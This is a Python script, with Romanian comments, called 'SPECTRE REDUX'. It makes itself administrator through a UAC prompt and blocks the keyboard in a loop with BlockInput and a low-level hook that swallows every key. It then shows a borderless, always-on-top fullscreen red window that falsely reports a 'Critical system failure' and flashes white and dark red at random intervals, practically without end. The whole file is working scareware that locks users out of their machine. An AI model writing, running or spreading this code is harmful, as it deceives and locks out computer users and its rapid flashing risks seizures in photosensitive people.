#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SPECTRE REDUX - Red screen with flashes and keyboard lock
Run as ADMINISTRATOR (script auto-elevates)
"""

import tkinter as tk
import threading
import time
import subprocess
import sys
import ctypes
import os
import random

# ============================================
# AUTO ADMIN RESTART
# ============================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
    sys.exit()

if not is_admin():
    run_as_admin()

# ============================================
# BLOCK KEYBOARD COMPLETELY
# ============================================

def block_keyboard():
    """
    Blochează TASTATURA complet folosind mai multe metode
    """
    try:
        # Metoda 1: Block input complet cu ctypes
        ctypes.windll.user32.BlockInput(True)
        
        # Metoda 2: Hook global pentru tastatură (dacă e instalat keyboard)
        try:
            import keyboard
            for i in range(150):
                keyboard.block_key(i)
        except:
            pass
            
        # Metoda 3: Disable tastatura prin API
        try:
            import pyautogui
            pyautogui.FAILSAFE = False
        except:
            pass
            
        # Metoda 4: Hook pentru toate tastele folosind ctypes
        WH_KEYBOARD_LL = 13
        user32 = ctypes.windll.user32
        
        def low_level_keyboard_handler(nCode, wParam, lParam):
            return 1  # Blochează toate tastele
        
        CALLBACK = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        callback = CALLBACK(low_level_keyboard_handler)
        user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0, 0)
        
    except:
        pass

def block_keys_permanent():
    """
    Blochează permanent tastele într-un thread separat
    """
    while True:
        try:
            block_keyboard()
            time.sleep(0.1)  # Reblochează la fiecare 100ms
        except:
            pass

# ============================================
# PHASE 1: RED FULLSCREEN WITH FLASHES
# ============================================

class RedFlashScreen:
    def __init__(self):
        self.root = tk.Tk()
        self.w = self.root.winfo_screenwidth()
        self.h = self.root.winfo_screenheight()
        self.flash_count = 0
        self.max_flashes = 999999  # Practic infinit
        
        # Configurare fereastră - fullscreen, fără borduri, deasupra tuturor
        self.root.configure(background="red")
        self.root.overrideredirect(True)
        self.root.geometry(f"{self.w}x{self.h}+0+0")
        self.root.attributes("-topmost", True)
        self.root.attributes("-fullscreen", True)
        self.root.focus_force()
        self.root.grab_set()
        
        # Text principal
        self.label1 = tk.Label(self.root, 
                              text="⚠️ SYSTEM ERROR ⚠️", 
                              font=("Segoe UI", 56, "bold"),
                              fg="white", bg="red")
        self.label1.pack(expand=True)
        
        # Text secundar
        self.label2 = tk.Label(self.root,
                              text="Critical system failure",
                              font=("Segoe UI", 28),
                              fg="white", bg="red")
        self.label2.pack()
        
        # Pornim blițurile
        self.start_flashes()
        
    def start_flashes(self):
        """Pornește blițurile cu roșu la intervale random"""
        self.flash_next()
        
    def flash_next(self):
        """Face un bliț și programează următorul"""
        if self.flash_count < self.max_flashes:
            # Alege un interval random pentru bliț (între 0.1 și 2 secunde)
            next_flash = random.uniform(0.1, 2.0)
            
            # Face blițul
            self.do_flash()
            
            # Programează următorul
            self.root.after(int(next_flash * 1000), self.flash_next)
            self.flash_count += 1
    
    def do_flash(self):
        """Efectuează un bliț (alb sau roșu intens)"""
        # Alege random între bliț alb sau roșu mai intens
        if random.choice([True, False]):
            # Bliț alb
            self.root.configure(background="white")
            self.label1.config(bg="white", fg="red")
            self.label2.config(bg="white", fg="red")
            self.root.after(50, self.reset_color)  # După 50ms revine la roșu
        else:
            # Bliț roșu intens
            self.root.configure(background="#8B0000")  # Dark red
            self.root.after(50, self.reset_color)
    
    def reset_color(self):
        """Revine la culoarea normală"""
        self.root.configure(background="red")
        self.label1.config(bg="red", fg="white")
        self.label2.config(bg="red", fg="white")
    
    def run(self):
        self.root.mainloop()

# ============================================
# MAIN EXECUTION
# ============================================

if __name__ == "__main__":
    # Pornim blocarea tastaturii în thread separat
    keyboard_thread = threading.Thread(target=block_keys_permanent, daemon=True)
    keyboard_thread.start()
    
    # Pornim ecranul roșu cu blițuri
    red_screen = RedFlashScreen()
    red_screen.run()
